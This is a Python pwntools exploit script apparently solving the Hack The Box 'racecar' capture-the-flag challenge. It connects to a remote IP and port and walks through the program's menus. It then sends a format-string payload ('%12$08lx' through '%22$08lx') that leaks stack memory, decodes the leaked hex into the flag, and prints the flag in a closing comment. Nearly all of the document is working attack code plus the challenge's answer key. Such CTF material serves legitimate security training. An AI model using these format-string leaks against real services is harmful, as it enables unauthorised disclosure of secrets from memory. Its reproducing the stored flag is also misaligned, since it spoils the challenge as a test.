from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './challenge/racecar'
elf = context.binary = ELF(exe, checksec=False)

# p = start()

p = remote("167.172.55.94", 30251)
p.sendlineafter(b'Name: ', b'vnc')
p.sendlineafter(b'Nickname: ', b'vnc')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')
payload = ''

for i in range(12, 23):
    payload += f'%{i}$08lx'
p.sendlineafter(b'> ', payload.encode())

p.recvline()
p.recvline()

out = p.recvline()[:-1].decode()
flag = b''
for i in range(0, len(out), 8):
    flag += bytes.fromhex(out[i:i+8])[::-1]

print(flag)
# flag: HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}
